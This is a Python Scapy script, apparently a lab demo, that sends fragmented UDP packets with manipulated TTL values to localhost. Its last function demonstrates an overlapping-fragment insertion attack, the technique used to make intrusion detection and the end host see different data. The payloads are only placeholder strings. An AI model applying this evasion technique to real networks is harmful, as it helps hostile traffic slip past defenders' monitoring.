import socket
import sys
import struct
import time
from scapy.all import *

SERVER_IP = '127.0.0.1'
SERVER_PORT = 9999
FRAGMENT_SIZE = 1400

def create_large_payload(size=3000):
    pattern = "FRAGMENTATION_TEST_" + "X" * 50 + "_PATTERN_"
    payload = ""
    while len(payload) < size:
        payload += pattern
    return payload[:size]

def send_fragmented_with_different_ttl():
    print("=== Part 2: TTL Manipulation Demo ===")
    payload = create_large_payload(3000)
    ip_packet = IP(dst=SERVER_IP, ttl=64)
    udp_packet = UDP(dport=SERVER_PORT)
    full_packet = ip_packet / udp_packet / payload

    print(f"Original packet size: {len(full_packet)} bytes")
    print(f"Payload size: {len(payload)} bytes")

    fragments = fragment(full_packet, fragsize=576)
    print(f"Number of fragments created: {len(fragments)}")

    ttl_values = [64, 32, 16, 8, 4, 2, 1]
    for i, frag in enumerate(fragments):
        frag[IP].ttl = ttl_values[i] if i < len(ttl_values) else 1
        print(f"Fragment {i+1}: TTL={frag[IP].ttl}, Size={len(frag)} bytes, Flags={frag[IP].flags}, Frag_offset={frag[IP].frag}")
        send(frag, verbose=0)
        time.sleep(0.1)

def send_fragmented_with_ttl_1():
    print("\n=== TTL=1 Test (All fragments) ===")
    payload = create_large_payload(2500)
    ip_packet = IP(dst=SERVER_IP, ttl=1)
    udp_packet = UDP(dport=SERVER_PORT)
    full_packet = ip_packet / udp_packet / payload

    print(f"Sending packet with TTL=1, size: {len(full_packet)} bytes")
    fragments = fragment(full_packet, fragsize=576)
    print(f"Number of fragments: {len(fragments)}")

    for i, frag in enumerate(fragments):
        frag[IP].ttl = 1
        print(f"Fragment {i+1}: TTL={frag[IP].ttl}, Size={len(frag)} bytes")
        send(frag, verbose=0)
        time.sleep(0.1)

def send_normal_fragmented():
    print("\n=== Normal Fragmentation (Control) ===")
    payload = create_large_payload(2000)
    ip_packet = IP(dst=SERVER_IP)
    udp_packet = UDP(dport=SERVER_PORT)
    full_packet = ip_packet / udp_packet / payload

    print(f"Sending normal fragmented packet, size: {len(full_packet)} bytes")
    send(full_packet, verbose=0)

def demonstrate_insertion_attack():
    print("\n=== Insertion Attack Demonstration ===")
    malicious_payload = "MALICIOUS_CONTENT_ATTACK_PAYLOAD"
    legitimate_payload = "LEGITIMATE_NORMAL_CONTENT_DATA"
    base_ip = IP(dst=SERVER_IP, id=12345)

    frag1 = base_ip.copy()
    frag1.ttl = 64
    frag1.frag = 0
    frag1.flags = "MF"
    packet1 = frag1 / UDP(dport=SERVER_PORT) / legitimate_payload[:20]

    frag2 = base_ip.copy()
    frag2.ttl = 2
    frag2.frag = 0
    frag2.flags = "MF"
    packet2 = frag2 / Raw(malicious_payload[:20])

    frag3 = base_ip.copy()
    frag3.ttl = 64
    frag3.frag = 3
    frag3.flags = 0
    packet3 = frag3 / Raw(legitimate_payload[20:])

    print(f"Fragment 1: TTL={packet1[IP].ttl}, Offset={packet1[IP].frag}, Flags={packet1[IP].flags}")
    print(f"Fragment 2: TTL={packet2[IP].ttl}, Offset={packet2[IP].frag}, Flags={packet2[IP].flags} (MALICIOUS)")
    print(f"Fragment 3: TTL={packet3[IP].ttl}, Offset={packet3[IP].frag}, Flags={packet3[IP].flags}")

    send(packet1, verbose=0)
    time.sleep(0.5)
    send(packet2, verbose=0)
    time.sleep(0.5)
    send(packet3, verbose=0)

if __name__ == "__main__":
    try:
        print("\n1. Different TTL values per fragment")
        send_fragmented_with_different_ttl()
        time.sleep(2)

        print("\n2. All fragments with TTL=1")
        send_fragmented_with_ttl_1()
        time.sleep(2)

        print("\n3. Normal fragmentation (comparison)")
        send_normal_fragmented()
        time.sleep(2)

        print("\n4. Insertion attack demonstration")
        demonstrate_insertion_attack()

    except Exception as e:
        print(e)
